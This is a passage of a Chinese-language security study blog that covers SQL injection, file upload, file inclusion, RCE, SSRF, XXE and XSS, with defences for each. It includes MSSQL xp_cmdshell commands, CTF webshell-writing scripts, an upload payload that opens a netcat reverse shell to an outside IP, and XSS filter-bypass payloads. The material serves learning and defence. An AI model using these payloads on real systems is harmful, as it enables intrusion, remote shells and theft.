class="hljs-params">()</span></span> 计算md5<br>Get_lock函数<br>RLIKE<br></code></pre></td></tr></table></figure><p><a href="https://www.gem-love.com/2022/01/26/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9AMySQL%E7%9B%B2%E6%B3%A8/">一文搞定 MySQL 盲注 | 颖奇 L’Amore (gem-love.com)</a></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>数据库采用宽字节编码（GB2312、GBK、GB18030、BIG5、Shift_JIS）同时与服务器不一致并且存在转义函数的时候</p><p>root %df’ or 1&#x3D;1 #</p><p>原理:在 GBK 编码中,反斜杠的编码是 %5c,在输入 %df’后，单引号前添加反斜杠后形成 %df%5c，而 %df%5c 是繁体字“連”，单引号成功逃逸</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/XZBHbKWeYo93CixzZEUcFTBWn6b.png"></p><p>注意：使用mysql_real_escape_string修复需要mysql_set_charset指定字符集</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成 SQL 的二次注入</p><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><p>在从数据库或文件中取数据的时候，也要进行转义或者过滤。</p><h2 id="写-shell"><a href="#写-shell" class="headerlink" title="写 shell"></a>写 shell</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1.绝对路径且读写</p><p>2.数据库权限</p><p>3.secure_file_priv非null（可日志绕过）</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/LxKEbLIeGoKwLQx0NqAcCTBfnNb.png"></p><p>日志绕过</p><p>4.防止命令执行：<code>disable_functions</code>，禁止了 <code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，</p><p>但是可以用 dl 扩展执行命令或者 ImageMagick 漏洞</p><p>其中 <code>open_basedir</code>: 将用户可操作的文件限制在某目录下</p><blockquote><p><a href="https://blog.csdn.net/xhy18634297976/article/details/119486812">https://blog.csdn.net/xhy18634297976/article/details/119486812</a></p></blockquote><p>5.GPC关闭 ||没有转义引号</p><h3 id="函数写入"><a href="#函数写入" class="headerlink" title="函数写入"></a>函数写入</h3><blockquote><p>outfile<br>dumpfile<br>file_put_content</p></blockquote><p>1.outfile 和 dumpfile 区别？</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/EKxjbOgbloC83kxDPFlcRuGDn1c.png"></p><p>2.outfile不能用了怎么办？</p><p> <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code></p><p>并且，outfile和dumpfile路径不能hex</p><p>可以UDF提权 <a href="https://www.cnblogs.com/milantgh/p/5444398.html">https://www.cnblogs.com/milantgh/p/5444398.html</a></p><h3 id="日志写入"><a href="#日志写入" class="headerlink" title="日志写入"></a>日志写入</h3><p>全局日志：开启后将日志路径指定为网站绝对路径下的一个文件，执行木马语句自动写入,绕过 secure_file_priv&#x3D;0</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><blockquote><p><a href="https://www.freebuf.com/articles/web/264790.html">https://www.freebuf.com/articles/web/264790.html</a></p></blockquote><p>udf 提权，mof 提权，启动项提权</p><p>获取 root 密码：1.配置文件 2.数据文件 3.爆破</p><h4 id="mof-提权"><a href="#mof-提权" class="headerlink" title="mof 提权"></a>mof 提权</h4><p>低版本 win 下自动运行的文件，在可写目录下写入执行语句然后 outfile 到 mof 文件（<code>C:\Windows\System32\wbem\MOF</code> 目录下的 <code>nullevt.mof</code>）中</p><h4 id="udf-提权"><a href="#udf-提权" class="headerlink" title="udf 提权"></a>udf 提权</h4><p>UDF(User Defined Funtion)用户自定义函数可以调用 dll 文件语句，将恶意 dll 文件导入 myslq 中并执行（linux 是 so 文件）</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/AdtebJP5foOLgexWJotccK0Fn5f.png"></p><ul><li>5.1之前在c:\windows\system32</li><li>5.2之后再MySQL&#x2F;Lib&#x2F;Plugin</li></ul><p>条件</p><ul><li>没有开启安全模式（确认secure_file_priv&#x3D;’’是否为空）</li><li>拥有增删改查权限（不过滤 into outfile 这种语句）</li><li>shell有写入目录权限</li></ul><p>3.启动项提权</p><p>4.反弹端口连接提权</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240818185948066.png" alt="image-20240818185948066"></p><p>空格：”%09”, “%0A”, “%0C”, “%0D”</p><p>union,where,select:注释符，大小写，内敛注释&#x2F;*!union*&#x2F;</p><p>where：limit 1,1</p><p>limit: group by having 条件</p><p>逗号：嵌套查询，union，编码或替代</p><p>limit处的逗号：limit 1 offset 1</p><p>单引号：需要两个注入点，例如账号输入1\就能将后面的单引号转义再在密码处进行注入</p><p>select：盲注，仅限当前表，可堆叠的话赋值变量为16</p><p>比较符号：greatest least between and</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627105613676.png" alt="image-20240627105613676"></p><h3 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h3><p>空格：特殊字符<img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240703221208778.png" alt="image-20240703221208778"></p><p>大小写替换</p><p>拼接chr(10)||chr(13)换行<img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240703221231678.png" alt="image-20240703221231678"></p><p>分块传输</p><p>脏数据</p><h3 id="SQLserver"><a href="#SQLserver" class="headerlink" title="SQLserver"></a>SQLserver</h3><p><a href="https://y4er.com/posts/mssql-getshell/">MSSQL多种姿势拿shell和提权</a></p><p>0.看有无sa权限，可以利用sp_configure重启xp_cmdshell，导出数据到web目录</p><p>1.xp_cmdshell 提权</p><p>拥有 shell 且有sytem权限，拿到sa口令后利用 cmdshell 组件默认的 system 权限</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 启用xp_cmdshell </span><br><span class="hljs-built_in">EXEC</span> master..sp_configure &#x27;<span class="hljs-keyword">show</span> advanced options&#x27;, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-built_in">EXEC</span> master..sp_configure &#x27;xp_cmdshell&#x27;, <span class="hljs-number">1</span>;RECONFIGURE; <br><span class="hljs-meta"># 通过xp_cmdshell执行系统命令 </span><br><span class="hljs-built_in">Exec</span> master.dbo.xp_cmdshell &#x27;whoami&#x27; <br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240703222641080.png" alt="image-20240703222641080"></p><p>2.sp_OACreate 提权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;    <br><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span>; <br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami&#x27;</span><br></code></pre></td></tr></table></figure><p>3.Log备份</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250210155128322.png" alt="image-20250210155128322"></p><p>4.差异备份</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/S1LebIjIToCo2FxRcHvce1SQnXg.png"></p><p>5.沙盒</p><p>6.Agent Job</p><h2 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h2><p>数据库：限制数据库权限，（进入数据库的数据和统一）编码</p><p>输入：数据类型长度限制，黑白名单</p><p>输出：前端控制回显，关闭报错</p><p>框架：参数化查询，预编译，ORM（对象关系映射）框架</p><p>宽字节注入需要mysql_set_charset(GBK)+mysql_real_escape_string解决</p><p>以下：order by开白名单；in配合for each；like用concat</p><p>除了order by还是一定要用# 只是需要拼接</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250305090233826.png" alt="image-20250305090233826"></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250305090244733.png" alt="image-20250305090244733"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="GPC"><a href="#GPC" class="headerlink" title="GPC"></a>GPC</h3><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/KU2WboPHMoDfRAxFuAqcYZoznCg.png"></p><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><p>用转义字符防御时，如果遇到数据库的列名或是表名本身就带着特殊字符，应该怎么做</p><p>特殊字符包裹（mysql &#96;&#96;）</p><p>规范化命名</p><p>白名单输入</p><h3 id="mysql-版本"><a href="#mysql-版本" class="headerlink" title="mysql 版本"></a>mysql 版本</h3><p>5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名。</p><p>5.0 以下是多用户单操作，5.0 以上是多用户多操作</p><h3 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h3><p>预编译sql模板，sql和参数分两次</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>1.MySQL ⽀持⼀些独特的SQL语法和函数 ⽐如可以利⽤ LOAD_FILE()来读取服务器⽂件 如果权限设置不当的话</p><p>2.SQL Server 有不同的系统存储过程和功能 如可以利⽤ xp_cmdshell来执⾏操作系统命令 如果该功能被启⽤且攻击者拥有⾜够权限的话</p><h3 id="MYSQL用户密码表"><a href="#MYSQL用户密码表" class="headerlink" title="MYSQL用户密码表"></a>MYSQL用户密码表</h3><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240703222656941.png" alt="image-20240703222656941"></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="防护："><a href="#防护：" class="headerlink" title="防护："></a>防护：</h3><ul><li>JS</li><li>路径角度：重命名，路径限制</li><li>文件角度：文件头，文件完整性，黑白名单后缀，mime</li></ul><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>1.各种解析漏洞如</p><p>%00：文件名后缀.php%00.jpg(nginx)</p><p>0x00:post 传参时</p><p>3.图片马</p><p>4.条件竞争（先上后检测）</p><p>5.文件名改造（替换，大小写，换行，编码，参数污染，异常闭合）</p><p>6.请求方式</p><p>7.分块参数 + 参数污染</p><p>8.长度字段</p><p>9.::data</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/DeBRbvFl2okFpkxIbicc8be2nzh.png"></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240628102144418.png" alt="image-20240628102144418"></p><p>输入点限制：禁止动态（白名单），特殊字符限制，目录限制</p><p>其他：魔术引号，禁止远程包含</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><blockquote><p><a href="https://xiaolong22333.top/archives/201/">https://xiaolong22333.top/archives/201/</a><br><a href="https://blog.csdn.net/miuzzx/article/details/125148989">https://blog.csdn.net/miuzzx/article/details/125148989</a><br><a href="https://www.sohu.com/a/208155480_354899">https://www.sohu.com/a/208155480_354899</a></p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/SQJAbQ1guo7jeYxgpbVclhhqnEf.png"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.文件名写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://ed9441a5-6e27-43b0-8538-bdd2f5a5b4d2.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;hp&quot;</span>,<br><span class="hljs-string">&quot;&gt;1.p\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;d\\&gt;\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;\\ -\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;e64\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bas\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;7\\|\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XSk\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;Fsx\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;dFV\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;kX0\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bCg\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XZh\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;AgZ\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;waH\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;PD9\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;o\\ \\&quot;</span>,<br><span class="hljs-string">&quot;&gt;ech\\&quot;</span>,<br><span class="hljs-string">&quot;ls -t&gt;0&quot;</span>,<br><span class="hljs-string">&quot;. 0&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>    data=&#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>:payload<br>    &#125;<br>    requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>        writeFile(p.strip())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>        time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>    <span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    run()<br>    check()<br>    <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;main&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>2.php 临时上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>import time<br><br>url = <span class="hljs-string">&quot;http://538ae548-ca26-4dfc-af73-ded632f3b6be.challenge.ctf.show/&quot;</span><br><br><br>def <span class="hljs-title function_ invoke__">getShell</span>(payload):<br>    data=&#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>:payload<br>    &#125;<br>    file = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:b<span class="hljs-string">&quot;#!/bin/sh\nnc 47.100.137.45 2233 -e /bin/sh&quot;</span><br>    &#125;<br>    requests.<span class="hljs-title function_ invoke__">post</span>(url,data=data,files=file)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!&quot;</span>)<br><br>def <span class="hljs-title function_ invoke__">run</span>():<br>    <span class="hljs-title function_ invoke__">getShell</span>(<span class="hljs-string">&quot;. /t*/*&quot;</span>)<br><br>def <span class="hljs-title function_ invoke__">main</span>():<br>    <span class="hljs-title function_ invoke__">run</span>()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">main</span>()<br></code></pre></td></tr></table></figure><p>3.dir 写入</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>探测内网信息，读取内网文件，攻击内网程序</p><p>常用协议：http ftp file dict gopher</p><p>危害：探测ip端口，读取文件，攻击其他服务，绕waf</p><p>功能点：处理文件，邮件，远程url内容，数据库内容</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240628101433951.png" alt="image-20240628101433951"></p><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h2><ul><li><p>IP进制转换</p></li><li><p>ip省略写法,[::]绕过localhost</p></li><li><p>dns解析 </p><p><a href="http://127.0.0.1.xip.io/%E5%8F%AF%E4%BB%A5%E6%8C%87%E5%90%91%E4%BB%BB%E6%84%8Fip%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%9Axip.io">http://127.0.0.1.xip.io/可以指向任意ip的域名：xip.io</a></p></li><li><p><a href="mailto:&#x75;&#114;&#x6c;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;">&#x75;&#114;&#x6c;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;</a></p></li><li><p>Enclosed alphanumerics字符集</p></li><li><p>dns重绑定（利用ttl）</p></li><li><p>协议限制绕过（header，crlf，redirect）</p></li><li><p>短地址生成</p></li><li><p>调用其他协议和方法（dict，gophet，http，file，ftp，telnet）</p></li></ul><h2 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h2><p>输入：ip转换为整数，urllib.parse，白名单</p><p>输出：检测返回内容，统一报错</p><p>其他：关闭不必要协议</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a><strong>常见场景</strong></h2><ul><li>pdf 在线解析</li><li>word 在线解析</li><li>定制协议</li><li>留言板等</li></ul><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a><strong>危害</strong></h2><ul><li>读取本地文件</li><li>执行系统命令</li><li>探测内网端口</li><li>攻击内网服务探测内网端口的协议有 gopher file dict，不同语言支持不同的协议</li></ul><p>是具体情况而定，file http ftp 是常用的</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>java利用file协议</p><p>php利用php:&#x2F;&#x2F;filter获取内容后外带</p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a><strong>防范</strong></h2><p>​过滤用户的xml数据。禁用外部实体</p><p>​python 用 lxml 时可以对 resolve_entities 设为 false。或者过滤用户提交的 xml,客户端也可以有 xxe，有的网站会使用 office 打开 docx 进行解析<br>​Java 解析 XML 的常用三方库，如果不禁用 DTD、Entity 都会导致 XXE 漏洞：</p><blockquote><p>javax.xml.stream.XMLStreamReader;<br>javax.xml.parsers.DocumentBuilderFactory;</p></blockquote><p>​跟逻辑设计有关而与语言无关，最好是不要让 XML 作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用 DTD、Entity。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h2><ul><li>窃取cookies</li><li>会话劫持</li><li>植入恶意软件</li><li>钓鱼攻击</li><li>修改网页内容</li></ul><p>​</p><h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><p>存储型XSS： 你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； </p><p>反射型XSS： 你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； <strong>后端处理</strong></p><p>DOM型XSS： 你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；<strong>由JavaScript处理</strong></p><h2 id="防护-3"><a href="#防护-3" class="headerlink" title="防护"></a>防护</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/IQa7btkGGoPGVnxQSkfcHAKAnLY.png"></p><p>策略：csp，http-only</p><p>输入：限制长度，html实体编码，黑白名单过滤</p><p>输出：编码</p><h2 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h2><ul><li>大小写</li><li>伪协议</li><li>分号</li><li>flash</li><li>html5新标签</li><li>双层标签</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 空格被过滤 --&gt;</span>用/代替<br>&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;<br><br><span class="hljs-comment">&lt;!-- 双写绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iimgmg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">oonerrornerror</span>=<span class="hljs-string">aimglert(1)</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 大小写绕过  --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iMg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">oNerRor</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 利用eval() --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;a=`aler`;b=`t(1)`;eval(a+b);&quot;</span>&gt;</span><br>//这里利用evel的拼接<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(atob(</span>&#x27;<span class="hljs-attr">YWxlcnQoMSk</span>=<span class="hljs-string">&#x27;))&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag"></span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;!-- 利用location --&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;img src=1 onerror=location=&#x27;</span><span class="hljs-attr">javascript:</span>%<span class="hljs-attr">61</span>%<span class="hljs-attr">6C</span>%<span class="hljs-attr">65</span>%<span class="hljs-attr">72</span>%<span class="hljs-attr">74</span>%<span class="hljs-attr">28</span>%<span class="hljs-attr">31</span>%<span class="hljs-attr">29</span>&#x27;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">location</span>=<span class="hljs-string">&#x27;javascript:\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">location</span>=<span class="hljs-string">&quot;javascr&quot;</span>+&quot;<span class="hljs-attr">ipt:</span>&quot;+&quot;%<span class="hljs-attr">61</span>%<span class="hljs-attr">6C</span>%<span class="hljs-attr">65</span>%<span class="hljs-attr">72</span>%<span class="hljs-attr">74</span>%<span class="hljs-attr">28</span>%<span class="hljs-attr">31</span>%<span class="hljs-attr">29</span>&quot;&gt;</span><br><br><span class="hljs-comment">&lt;!-- 括号被过滤 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;window.οnerrοr=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- onerror=被过滤 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>     =<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span></span><br><span class="hljs-tag">=<span class="hljs-string">alert(1)</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 属性被转换为大写 --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 编码后被检测 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x00000061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="输出到href标签"><a href="#输出到href标签" class="headerlink" title="输出到href标签"></a>输出到href标签</h3><p>输出到herf中的xss<img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250124170627972.png" alt="image-20250124170627972"></p><p>herf防护：</p><ul><li>限制输入http开头</li><li>csp策略</li></ul><h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>浏览器内容安全策略，减少xss攻击</p><h3 id="如何绕过Http-only？"><a href="#如何绕过Http-only？" class="headerlink" title="如何绕过Http-only？"></a><strong>如何绕过Http-only？</strong></h3><blockquote><p>HTTP-Only禁止的是JS读取cookie信息，Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄露</p></blockquote><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250202222352186.png" 